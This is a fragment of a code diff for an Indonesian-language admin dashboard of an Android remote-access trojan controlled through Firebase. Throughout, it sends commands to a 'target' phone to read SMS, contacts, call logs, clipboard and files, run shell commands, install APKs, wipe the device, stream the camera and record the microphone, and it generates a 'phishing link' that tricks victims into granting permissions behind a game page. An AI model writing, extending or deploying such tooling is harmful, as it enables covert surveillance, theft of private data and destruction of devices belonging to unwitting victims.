-        function browseFiles() {
-            if (!currentTarget) return;
-            const path = document.getElementById('filePath').value || '/sdcard/';
-            db.ref(`commands/${currentTarget}`).set({
-                command: 'browseFiles',
-                path: path,
-                timestamp: Date.now()
-            });
-        }
-        
-        function downloadFile() { /* Implementasi */ }
-        function uploadFile() { /* Implementasi */ }
-        
-        function readSMS() {
-            if (!currentTarget) return;
-            db.ref(`commands/${currentTarget}`).set({ command: 'readSMS', timestamp: Date.now() });
-        }
-        
-        function sendSMS() {
-            if (!currentTarget) return;
-            db.ref(`commands/${currentTarget}`).set({
-                command: 'sendSMS',
-                number: document.getElementById('smsNumber').value,
-                message: document.getElementById('smsMessage').value,
-                timestamp: Date.now()
-            });
-        }
-        
-        function getContacts() {
-            if (!currentTarget) return;
-            db.ref(`commands/${currentTarget}`).set({ command: 'getContacts', timestamp: Date.now() });
-        }
-        
-        function sendNotification() {
-            if (!currentTarget) return;
-            db.ref(`commands/${currentTarget}`).set({
-                command: 'notification',
-                title: document.getElementById('notifTitle').value,
-                body: document.getElementById('notifBody').value,
-                timestamp: Date.now()
-            });
-        }
-        
-        function executeShell() {
-            if (!currentTarget) return;
-            db.ref(`commands/${currentTarget}`).set({
-                command: 'shell',
-                cmd: document.getElementById('shellCommand').value,
-                timestamp: Date.now()
-            });
-        }
-        
-        function getInstalledApps() {
-            if (!currentTarget) return;
-            db.ref(`commands/${currentTarget}`).set({ command: 'getApps', timestamp: Date.now() });
-        }
-        
-        function getClipboard() {
-            if (!currentTarget) return;
-            db.ref(`commands/${currentTarget}`).set({ command: 'getClipboard', timestamp: Date.now() });
-        }
-        
-        function getCallLogs() {
-            if (!currentTarget) return;
-            db.ref(`commands/${currentTarget}`).set({ command: 'getCallLogs', timestamp: Date.now() });
-        }
-        
-        function getWifiNetworks() {
-            if (!currentTarget) return;
-            db.ref(`commands/${currentTarget}`).set({ command: 'getWifi', timestamp: Date.now() });
-        }
-        
-        function lockDevice() {
-            if (!currentTarget) return;
-            db.ref(`commands/${currentTarget}`).set({ command: 'lock', timestamp: Date.now() });
-        }
-        
-        function vibrateDevice() {
-            if (!currentTarget) return;
-            db.ref(`commands/${currentTarget}`).set({ command: 'vibrate', duration: 1000, timestamp: Date.now() });
-        }
-        
-        function openURL() {
-            if (!currentTarget) return;
-            db.ref(`commands/${currentTarget}`).set({
-                command: 'openURL',
-                url: document.getElementById('urlInput').value,
-                timestamp: Date.now()
-            });
-        }
-        
-        function installAPK() {
-            if (!currentTarget) return;
-            db.ref(`commands/${currentTarget}`).set({
-                command: 'installAPK',
-                url: document.getElementById('apkUrl').value,
-                timestamp: Date.now()
-            });
-        }
-        
-        function wipeDevice() {
-            if (!currentTarget) return;
-            if (confirm('⚠️ Yakin ingin WIPE device target?')) {
-                db.ref(`commands/${currentTarget}`).set({ command: 'wipe', timestamp: Date.now() });
+        let videoActive = false;
+        function toggleVideoStream() {
+            if (videoActive) {
+                sendCmd('stopVideo');
+                videoActive = false;
+                document.getElementById('cameraArea').innerHTML = '<span style="color:#8b949e;">Stream stop</span>';
+                addLog('Stream stop');
+            } else {
+                sendCmd('startVideo');
+                videoActive = true;
+                document.getElementById('cameraArea').innerHTML = '<span style="color:#ffaa00;">📡 Menunggu stream...</span>';
+                addLog('Stream start');
+                listenVideoStream(currentTarget);
             }
         }
         
-        function uninstallApp() {
-            if (!currentTarget) return;
-            db.ref(`commands/${currentTarget}`).set({ command: 'uninstallSelf', timestamp: Date.now() });
+        function listenVideoStream(id) {
+            db.ref(`targets/${id}/videoFrame`).off();
+            db.ref(`targets/${id}/videoFrame`).on('value', (snap) => {
+                const data = snap.val();
+                if (data && data.base64 && videoActive) {
+                    document.getElementById('cameraArea').innerHTML = 
+                        `<img src="${data.base64}" alt="Stream" style="max-width:100%;max-height:260px;" />`;
+                }
+            });
         }
         
-        function generatePhishingLink() {
-            const link = targetLink + '?ref=' + btoa(Date.now());
-            document.getElementById('phishingLink').value = link;
-        }
-        
-        function copyPhishingLink() {
-            const input = document.getElementById('phishingLink');
-            input.select();
-            document.execCommand('copy');
-            alert('Link disalin!');
-        }
-        
-        function switchTab(tab) {
-            document.getElementById('tab-users').style.display = tab === 'users' ? 'grid' : 'none';
-            document.getElementById('tab-logs').style.display = tab === 'logs' ? 'block' : 'none';
-            document.getElementById('tab-phishing').style.display = tab === 'phishing' ? 'block' : 'none';
-            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-            event.target.classList.add('active');
-        }
-        
-        db.ref('commands').on('child_changed', (snapshot) => {
-            const cmd = snapshot.val();
-            if (cmd && cmd.result) {
-                document.getElementById('systemLogs').innerHTML += `[${new Date().toLocaleTimeString()}] ${snapshot.key}: ${JSON.stringify(cmd.result)}<br>`;
-                if (cmd.result.shell) document.getElementById('shellOutput').textContent = cmd.result.shell;
-                if (cmd.result.sms) document.getElementById('smsList').innerHTML = cmd.result.sms.map(s => `<div class="sms-item">📩 ${s.address}: ${s.body}</div>`).join('');
-                if (cmd.result.contacts) document.getElementById('contactList').innerHTML = cmd.result.contacts.map(c => `<div>👤 ${c.name}: ${c.number}</div>`).join('');
-                if (cmd.result.files) document.getElementById('fileList').innerHTML = cmd.result.files.map(f => `<div class="file-item">${f}</div>`).join('');
-                if (cmd.result.photo) document.getElementById('camPreview').src = cmd.result.photo;
-                if (cmd.result.apps) document.getElementById('extraData').innerHTML = cmd.result.apps.join('<br>');
-                if (cmd.result.clipboard) document.getElementById('extraData').innerHTML = '📋 Clipboard: ' + cmd.result.clipboard;
-                if (cmd.result.callLogs) document.getElementById('extraData').innerHTML = JSON.stringify(cmd.result.callLogs);
-                if (cmd.result.wifi) document.getElementById('extraData').innerHTML = cmd.result.wifi.join('<br>');
+        let micActive = false;
+        function toggleMic() {
+            if (micActive) {
+                sendCmd('stopMic');
+                micActive = false;
+                document.getElementById('micBtn').textContent = '▶ Rekam';
+                document.getElementById('micStatus').textContent = 'Mikrofon idle';
+                addLog('Rekaman stop');
+            } else {
+                sendCmd('startMic');
+                micActive = true;
+                document.getElementById('micBtn').textContent = '⏹ Stop';
+                document.getElementById('micStatus').textContent = '🔴 Merekam...';
+                addLog('Rekaman mulai');
             }
-        });
+        }
         
-        loadUsers();
+        function downloadAudio() {
+            if (!currentTarget) return;
+            const d = allDevices[currentTarget];
+            if (d && d.audioRecording && d.audioRecording.base64) {
+                const link = document.createElement('a');
+                link.href = d.audioRecording.base64;
+                link.download = `audio_${currentTarget}_${Date.now()}.webm`;
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                toast('✅ Audio terdownload!', 'success');
+            } else {
+                toast('⚠️ Belum ada rekaman', 'warning');
+            }
+        }
+        
+        function sendNotif() {
+            if (!currentTarget) return;
+            sendCmd('notification', {
+                title: document.getElementById('notifTitle').value || 'Info',
+                body: document.getElementById('notifBody').value || 'Pesan baru'
+            });
+            addLog('Notif dikirim');
+        }
+        
+        function openUrl() {
+            if (!currentTarget) return;
+            const url = document.getElementById('urlInput').value;
+            if (!url) return;
+            sendCmd('openURL', { url });
+            addLog(`Buka URL: ${url}`);
+        }
+        
+        function lockScreen() { if (currentTarget) { sendCmd('lock'); addLog('Layar dikunci'); } }
+        function vibratePhone() { if (currentTarget) { sendCmd('vibrate'); addLog('Getar'); } }
+        function wipeConfirm() {
+            if (!currentTarget) return;
+            if (confirm('Yakin hapus data?')) {
+                sendCmd('wipe');
+                addLog('⚠️ Wipe command sent', 'warn');
+                toast('⚠️ Perintah hapus dikirim!', 'warning');
+            }
+        }
+        
+        function requestUpdate() { if (currentTarget) { sendCmd('updateInfo'); addLog('Update info...'); } }
+        function refreshAll() { addLog('Refresh...'); loadDevices(); }
+        
+        function sendCmd(command, data = {}) {
+            if (!currentTarget) return;
+            db.ref(`commands/${currentTarget}`).set({ command, ...data, timestamp: Date.now() });
+        }
+        
+        // Link
+        function showLinkModal() {
+            const link = window.location.href.replace('admin.html', 'index.html').replace(/\/$/, '');
+            const r = btoa(Date.now());
+            const fullLink = `${link}?r=${r}`;
+            
+            const modal = document.createElement('div');
+            modal.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.8);z-index:999;display:flex;align-items:center;justify-content:center;';
+            modal.innerHTML = `
+                <div style="background:#161b22;border:1px solid #30363d;border-radius:12px;padding:24px;max-width:500px;width:90%;">
+                    <h3 style="color:#fff;margin-bottom:8px;">🔗 Link Phishing</h3>
+                    <p style="color:#8b949e;font-size:13px;margin-bottom:12px;">Target buka index.html → izinkan → redirect ke game.html</p>
+                    <input type="text" value="${fullLink}" readonly style="width:100%;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:8px;border-radius:4px;margin-bottom:8px;" id="linkCopy" />
+                    <button class="btn primary" style="width:100%;margin-bottom:4px;" onclick="navigator.clipboard.writeText('${fullLink}');alert('Disalin!');">📋 Salin Link</button>
+                    <button class="btn" style="width:100%;" onclick="this.closest('[style*=fixed]').remove();">Tutup</button>
+                </div>
+            `;
+            document.body.appendChild(modal);
+        }
+        
+        loadDevices();
+        addLog('Dashboard siap.');
+        
+        // Cek error setiap 30 detik
+        setInterval(checkAllErrors, 30000);
     </script>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 </body>
 </html>
